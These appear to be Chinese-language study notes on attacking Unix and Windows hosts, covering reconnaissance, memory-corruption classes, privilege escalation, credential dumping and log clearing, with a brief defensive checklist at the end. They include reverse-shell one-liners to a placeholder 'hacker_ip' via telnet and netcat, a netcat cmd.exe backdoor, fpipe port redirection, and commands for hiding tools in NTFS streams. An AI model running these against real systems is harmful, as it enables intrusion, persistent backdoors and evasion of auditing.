攻击Unix
收集信息
进行目标查点，尽可能获取信息，包括操作系统版本，开放的端口，运行的服务，正确的用户名
弱点映射，根据获取的目标各种信息，猜测可能的漏洞

远程访问
     利用某个监听服务的漏洞
     目标可能开启了IP转发，可借此渗透内网
     用户发起的远程执行，如访问恶意网站
     混杂模式攻击，如果网络嗅探器有漏洞，收到攻击者发送的数据包，将不堪设想

暴力破解攻击，最基本的攻击形式，如果目标采用弱口令，hydra将是直接有效的
数据驱动攻击
     缓冲区溢出攻击，攻击者发送超过缓冲区长度的代码串，该代码串冲出缓冲区，可以修改正在调用函数的返回地址，执行恶意代码
     Return-to-libc，目标禁止了堆栈执行，那么将恶意代码写入堆栈已经没有意义了，可以修改返回地址到标准C库中
     格式化字符串攻击，如果格式化指令比参数多，那么堆栈中后面的数据将会当作参数，printf使用%n可往内存写数据
     输入验证攻击，处理程序没能正确分析用户输入，被绕过赋予权限
     整数溢出攻击，类型不匹配，如int转short，有符号与无符号
     悬摆指针
获得shell
     telnet反向通道，本地监听80.25端口，在目标主机上通过漏洞执行
         /bin/telnet hacker_ip 80 | /bin/sh | /bin/telnet hacker_ip 80
     直接使用netcat  nc -e /bin/sh hacker_ip port

常见远程攻击
     FTP服务配置不当，允许匿名访问，往主目录写文件
     RPC服务，通过rpcinfo获取服务列表，通过漏洞攻陷系统
     NFS服务，依赖于RPC，如果配置不当，系统文件将暴露
     X Window系统的不安全配置
     DNS服务，常用缓存毒化攻击
     SSH服务常见漏洞
     OpenSSL，容易遭受Dos攻击
     Apache，容易遭受Dos攻击
提升权限
     查看/etc/passwd，查看用户情况
     找出SUID文件，寻找漏洞
     找出全局可写文件，经常修改public用户shell启动文件，例如.login、.bashrc创建一个SUID的.user文件

获取root权限后
使用Rootkit发掘目标系统
     特洛伊木马，可以对目标系统的命令木马化，修改二进制文件，使运行时执行一些恶意操作，或者返回攻击者系统的后门，如Rathole工具
     嗅探程序，在目标系统上运行嗅探程序，获取敏感的信息
     日志清理攻击，使用logclean-ng，先查看/etc/syslog.conf得知日志系统结构，可以使用who /var/log/wtmp查看系统的登陆日志；清理历史命令记录，使用badattachK拦截日志，丢弃攻击者信息
内核rootkit，直接注入内核，破坏性大，例如修改系统调用表、中断描述表，使目标执行恶意操作


攻击Windows
远程登录系统
猜测口令
利用服务漏洞
客户端漏洞，例如IE、outlook
设备驱动程序

取得权限后
使用工具提升权限
administrator权限下使用调度程序获取system权限
获取系统注册表中的账户口令，用pwdump工具，将代码注入高优先级的进程中，提取哈希值
使用LSADump2获取缓存中的口令，windows会将诸多敏感信息缓存在本地注册表中
使用WCE导出内存中的哈希值，保存着远程登陆到此计算机的账户哈希值

远程控制和后门
netcat创建后门 nc -L -d -e cmd.exe -p 8080，当有客户端连接时，启动cmd.exe返回shell
psexec访问SMB服务
如果目标开启3389远程桌面服务，尝试用破解的账号密码连接
如果无效，安装VNC服务获取图形界面
端口重定向，绕开防火墙，深入内网
通过返回的shell执行  fpipe -l 80 -s 90 -r 80 202.98.177.162  ：
     In: 127.0.0.1:2092 --> 127.0.0.1:80
     Out: 192.168.168.112:90 --> 202.98.177.162:80

掩盖入侵痕迹
关闭核审功能，使用Resource Kit工具包里的auditpol轻易关闭Audit策略，撤退时再开启
清理事件日志，手动修改或则使用elsave清除日志
隐藏toolkit，方便以后使用：
     attrib命令  attrib +h [directory]，但在资源管理器中选中显示所有文件会暴露出来
     额外文件流 NTFS允许单个文件存在多个信息流
         cp nc.exe oso001.009:nc.exe  隐藏nc.exe
         cp oso001.009:nc.exe nc        提取nc.exe

防御措施
文件
     检查攻击者留下的工具包，有可能通过重命名或者额外文件流隐藏起来
注册表
     清理注册表，检查开机自启动表项，以及软件安装信息表项
     限制用户对注册表主键的访问权限
进程
     定期检查进程表
     检查Scheduler调度程序，攻击者可能借此获得SYSTEM权限启动进程
端口
     检查端口开放情况
